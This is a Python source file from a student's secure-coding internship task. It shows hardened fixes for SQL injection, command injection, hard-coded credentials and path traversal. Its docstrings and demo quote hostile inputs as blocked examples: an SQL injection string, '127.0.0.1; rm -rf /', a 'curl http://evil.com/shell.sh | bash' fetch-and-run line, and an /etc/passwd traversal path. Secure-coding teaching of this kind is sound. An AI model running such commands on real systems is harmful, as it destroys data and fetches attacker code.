"""
secure_code.py
==============
CodeAlpha Cybersecurity Internship - Task 3: Secure Coding Review
Student: BAGATHEESHWAR A | ID: CA/DF1/82983

PURPOSE:
    This file contains the SECURE, HARDENED versions of all vulnerable
    functions from vulnerable_code.py. Each fix is annotated with the
    specific technique used and the CWE it addresses.

FIXES APPLIED:
    ✅ Parameterized queries          → Eliminates SQL Injection
    ✅ Input validation + allowlist   → Eliminates Command Injection
    ✅ Environment variables          → Eliminates Hardcoded Credentials
    ✅ Path canonicalization          → Eliminates Path Traversal
    ✅ Secure file permissions        → Fixes Insecure File Handling
    ✅ Secrets management             → Proper credential storage
"""

import sqlite3
import os
import subprocess
import re
import logging
import hashlib
import secrets
from pathlib import Path

# ============================================================
# SECURE CONFIGURATION — Using Environment Variables
# CWE-798 Fix: No Hard-coded Credentials
# ============================================================

# ✅ SECURE: Credentials loaded from environment variables at runtime.
# Set these in your shell or a .env file (never commit .env to Git).
# Example setup:
#   export DB_HOST="192.168.1.100"
#   export DB_USER="admin"
#   export DB_PASSWORD="YourStrongPassword"
#   export SECRET_KEY="$(python3 -c 'import secrets; print(secrets.token_hex(32))')"
#   export API_KEY="your-api-key-here"

DB_HOST     = os.environ.get("DB_HOST")
DB_USER     = os.environ.get("DB_USER")
DB_PASSWORD = os.environ.get("DB_PASSWORD")
SECRET_KEY  = os.environ.get("SECRET_KEY")
API_KEY     = os.environ.get("API_KEY")

# Validate that required environment variables are actually set
_required_vars = ["DB_HOST", "DB_USER", "DB_PASSWORD", "SECRET_KEY"]
_missing = [v for v in _required_vars if not os.environ.get(v)]
if _missing:
    raise EnvironmentError(
        f"Missing required environment variables: {', '.join(_missing)}\n"
        f"Set them before running this application."
    )

# ✅ SECURE: Configure logging — never log sensitive data
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)


# ============================================================
# SECURE DATABASE CONNECTION
# ============================================================

# ✅ SECURE: Fixed database path inside application directory
_DB_PATH = Path(__file__).parent / "data" / "users.db"

def connect_database():
    """
    ✅ SECURE: Uses a fixed, controlled database path.
    The path is defined by the application, not user input.
    """
    _DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(_DB_PATH))
    conn.execute("PRAGMA foreign_keys = ON")   # Enable FK constraints
    return conn


def initialize_database():
    """
    ✅ SECURE: Creates the users table with proper schema including
    password hashing (never store plaintext passwords).
    """
    conn = connect_database()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT    NOT NULL UNIQUE,
            password TEXT    NOT NULL,   -- stores bcrypt/pbkdf2 hash
            salt     TEXT    NOT NULL,
            created  DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    logger.info("Database initialized.")


# ============================================================
# FIX 1: SQL INJECTION → PARAMETERIZED QUERIES
# CWE-89 Fix: Proper Neutralization of SQL Input
# ============================================================

def get_user(username: str):
    """
    ✅ SECURE: Uses parameterized query (prepared statement).
    
    The ? placeholder is handled by the SQLite driver — user input is
    NEVER concatenated into the query string. The database treats the
    value as pure data, not executable SQL.
    
    Attack attempt "admin' OR '1'='1" is safely treated as a literal
    username string and will simply find no matching user.
    """
    # ✅ Input length validation
    if not username or len(username) > 64:
        logger.warning("Invalid username length.")
        return None

    # ✅ Allow only alphanumeric + underscore usernames
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        logger.warning("Username contains invalid characters.")
        return None

    conn = connect_database()
    cursor = conn.cursor()

    # ✅ SECURE: Parameterized query — input is NEVER part of the SQL string
    query = "SELECT id, username FROM users WHERE username = ?"
    cursor.execute(query, (username,))   # ← Safely bound parameter
    result = cursor.fetchone()
    conn.close()
    return result


def hash_password(password: str, salt: str = None) -> tuple[str, str]:
    """
    ✅ SECURE: Hashes passwords using PBKDF2-HMAC-SHA256.
    Never store plaintext passwords.
    
    Returns:
        (hashed_password, salt) tuple
    """
    if salt is None:
        salt = secrets.token_hex(32)   # ← Cryptographically secure random salt
    
    dk = hashlib.pbkdf2_hmac(
        hash_name='sha256',
        password=password.encode('utf-8'),
        salt=salt.encode('utf-8'),
        iterations=260_000   # NIST recommended minimum (2023)
    )
    return dk.hex(), salt


def login(username: str, password: str) -> bool:
    """
    ✅ SECURE: Parameterized query + password hashing.
    
    Fixes:
    - SQL injection: parameterized query
    - Plaintext password comparison: uses PBKDF2 hash comparison
    - Timing attacks: uses secrets.compare_digest for constant-time compare
    """
    if not username or not password:
        return False

    # ✅ Username validation
    if not re.match(r'^[a-zA-Z0-9_]{1,64}$', username):
        logger.warning("Login attempt with invalid username format.")
        return False

    conn = connect_database()
    cursor = conn.cursor()

    # ✅ SECURE: Parameterized query fetches only hash+salt, not plaintext
    cursor.execute(
        "SELECT password, salt FROM users WHERE username = ?",
        (username,)
    )
    row = cursor.fetchone()
    conn.close()

    if not row:
        # ✅ Perform dummy hash to prevent timing-based username enumeration
        hash_password("dummy_password_to_prevent_timing_attack")
        return False

    stored_hash, salt = row

    # ✅ SECURE: Re-hash supplied password with stored salt
    supplied_hash, _ = hash_password(password, salt)

    # ✅ SECURE: Constant-time comparison prevents timing attacks
    return secrets.compare_digest(supplied_hash, stored_hash)


# ============================================================
# FIX 2: COMMAND INJECTION → ALLOWLIST + NO SHELL
# CWE-78 Fix: Proper Neutralization of OS Command Input
# ============================================================

# ✅ SECURE: Strict allowlist of valid IP address pattern
_IP_REGEX = re.compile(
    r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$'
)

# ✅ SECURE: Allowlist of permitted diagnostic tools
_ALLOWED_TOOLS = frozenset(["ifconfig", "netstat", "ip", "ss", "nmap"])


def ping_host(ip_address: str) -> str:
    """
    ✅ SECURE: Uses an allowlist + shell=False to prevent command injection.
    
    Fixes:
    1. Validates ip_address against strict regex (only valid IPs pass)
    2. shell=False: subprocess does NOT invoke /bin/sh
    3. Command is a list, not a string (no shell interpretation)
    4. timeout prevents denial-of-service via hanging process
    
    Attack attempt "127.0.0.1; rm -rf /" fails validation immediately.
    """
    # ✅ Validate IP address format strictly
    if not _IP_REGEX.match(ip_address):
        logger.warning(f"Rejected invalid IP address: {ip_address!r}")
        return "Error: Invalid IP address format."

    # ✅ SECURE: shell=False + list form = no shell interpretation possible
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "2", ip_address],   # ← List, not string
            shell=False,           # ← Critical: no shell spawned
            capture_output=True,
            text=True,
            timeout=5              # ← Prevents hang / DoS
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        logger.warning(f"Ping timed out for: {ip_address}")
        return "Error: Ping timed out."
    except Exception as e:
        logger.error(f"Ping error: {e}")
        return "Error: Ping failed."


def run_diagnostics(tool_name: str) -> str:
    """
    ✅ SECURE: Allowlist validation before any execution.
    Only pre-approved tools can be run; no arbitrary commands.
    
    Attack attempt "whoami; curl http://evil.com/shell.sh | bash"
    is rejected immediately — 'whoami' is not in the allowlist.
    """
    # ✅ SECURE: Check against explicit allowlist
    if tool_name not in _ALLOWED_TOOLS:
        logger.warning(f"Rejected unauthorized diagnostic tool: {tool_name!r}")
        return f"Error: Tool '{tool_name}' is not permitted."

    try:
        result = subprocess.run(
            [tool_name],       # ← Single-element list, no arguments allowed
            shell=False,       # ← No shell
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout
    except FileNotFoundError:
        return f"Error: Tool '{tool_name}' not found on this system."
    except Exception as e:
        logger.error(f"Diagnostic error: {e}")
        return "Error: Could not run diagnostic."


# ============================================================
# FIX 3: INSECURE FILE HANDLING → PATH CANONICALIZATION
# CWE-22 Fix: Path Traversal | CWE-732 Fix: File Permissions
# ============================================================

# ✅ SECURE: Define a fixed, trusted base directory for all file operations
_BASE_UPLOAD_DIR = Path(__file__).parent / "uploads"
_MAX_UPLOAD_BYTES = 5 * 1024 * 1024   # 5 MB limit

# ✅ SECURE: Allowed file extensions (allowlist)
_ALLOWED_EXTENSIONS = frozenset([".txt", ".log", ".csv", ".json", ".pdf"])


def _safe_path(base_dir: Path, filename: str) -> Path:
    """
    ✅ SECURE: Resolves the full path and verifies it stays within base_dir.
    This is the canonical way to prevent path traversal.
    
    Uses Path.resolve() which resolves all '..' and symlinks,
    then checks that the result starts with the trusted base directory.
    """
    base_dir = base_dir.resolve()
    # Strip any directory separators from the filename
    safe_name = Path(filename).name   # ← Takes only the final filename component
    full_path = (base_dir / safe_name).resolve()

    # ✅ CRITICAL CHECK: Ensure resolved path is inside base_dir
    if not str(full_path).startswith(str(base_dir)):
        raise ValueError(f"Path traversal detected: {filename!r}")

    return full_path


def read_user_file(filename: str) -> str:
    """
    ✅ SECURE: Restricts file reads to the uploads directory only.
    
    Attack attempt "../../../../etc/passwd":
    - _safe_path strips to "passwd"
    - Resolves to /app/uploads/passwd
    - If that file doesn't exist → FileNotFoundError (safe)
    - /etc/passwd is NEVER accessible
    """
    try:
        safe_path = _safe_path(_BASE_UPLOAD_DIR, filename)
    except ValueError as e:
        logger.warning(f"Path traversal attempt blocked: {e}")
        return "Error: Access denied."

    if not safe_path.exists():
        return "Error: File not found."

    # ✅ Only allow reading permitted file types
    if safe_path.suffix.lower() not in _ALLOWED_EXTENSIONS:
        logger.warning(f"Blocked read of disallowed file type: {safe_path.suffix}")
        return "Error: File type not permitted."

    try:
        return safe_path.read_text(encoding='utf-8')
    except Exception as e:
        logger.error(f"File read error: {e}")
        return "Error: Could not read file."


def write_log(filename: str, content: str) -> bool:
    """
    ✅ SECURE: Three fixes applied:
    1. Path canonicalization prevents traversal
    2. Secure file permissions (0o640: owner rw, group r, others none)
    3. Content is sanitized (strip null bytes and control characters)
    """
    # ✅ Define a separate, dedicated log directory
    log_dir = Path(__file__).parent / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)

    try:
        safe_path = _safe_path(log_dir, filename)
    except ValueError as e:
        logger.warning(f"Path traversal in write_log blocked: {e}")
        return False

    # ✅ Sanitize content — strip null bytes and non-printable characters
    sanitized = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', content)

    try:
        # ✅ SECURE: Restrictive permissions — 0o640 (owner rw, group r, no others)
        with open(safe_path, 'a',
                  opener=lambda path, flags: os.open(path, flags, 0o640)) as f:
            f.write(sanitized + "\n")
        return True
    except Exception as e:
        logger.error(f"Log write error: {e}")
        return False


def save_upload(filename: str, data: bytes) -> bool:
    """
    ✅ SECURE: Four fixes applied:
    1. Path canonicalization prevents traversal
    2. File type allowlist prevents uploading executables
    3. File size limit prevents DoS
    4. Permissions set to 0o640 (not executable, not world-readable)
    """
    # ✅ Validate file size first (before touching filesystem)
    if len(data) > _MAX_UPLOAD_BYTES:
        logger.warning(f"Upload rejected: size {len(data)} exceeds limit.")
        return False

    # ✅ Validate filename characters (no special chars except . _ -)
    if not re.match(r'^[a-zA-Z0-9._\-]+$', filename):
        logger.warning(f"Upload rejected: invalid filename {filename!r}")
        return False

    # ✅ Validate file extension against allowlist
    ext = Path(filename).suffix.lower()
    if ext not in _ALLOWED_EXTENSIONS:
        logger.warning(f"Upload rejected: disallowed extension {ext!r}")
        return False

    # ✅ Canonicalize path
    try:
        _BASE_UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
        safe_path = _safe_path(_BASE_UPLOAD_DIR, filename)
    except ValueError as e:
        logger.warning(f"Path traversal in upload blocked: {e}")
        return False

    try:
        # ✅ SECURE: 0o640 — not executable, not world-readable
        with open(safe_path, 'wb',
                  opener=lambda path, flags: os.open(path, flags, 0o640)) as f:
            f.write(data)
        logger.info(f"File saved securely: {safe_path.name}")
        return True
    except Exception as e:
        logger.error(f"Upload save error: {e}")
        return False


# ============================================================
# SECURE: No sensitive data in logs or debug output
# CWE-200 Fix: Controlled Information Exposure
# ============================================================

def log_user_info(user_id: int, username: str) -> None:
    """
    ✅ SECURE: Logs only non-sensitive identifiers.
    Passwords, tokens, and keys are NEVER logged.
    """
    # ✅ Only log safe fields — never passwords, tokens, or keys
    logger.info(f"User activity: id={user_id}, username={username!r}")


# ============================================================
# MAIN — SECURITY DEMONSTRATION
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  SECURE CODE DEMO")
    print("=" * 60)

    print("\n[1] SQL Injection Prevention:")
    print("    Parameterized queries used — input never touches SQL string.")
    result = get_user("admin' OR '1'='1")
    print(f"    Injection attempt result: {result} (safely None)")

    print("\n[2] Command Injection Prevention:")
    result = ping_host("127.0.0.1; rm -rf /")
    print(f"    Injection attempt result: {result}")

    print("\n[3] Credentials from environment:")
    key_display = (SECRET_KEY[:4] + "****") if SECRET_KEY else "NOT SET"
    print(f"    SECRET_KEY visible in code: NO — first 4 chars: {key_display}")

    print("\n[4] Path Traversal Prevention:")
    result = read_user_file("../../../../etc/passwd")
    print(f"    Traversal attempt result: {result}")

    print("\n✅ All vulnerabilities have been fixed. See review_report.md for details.")
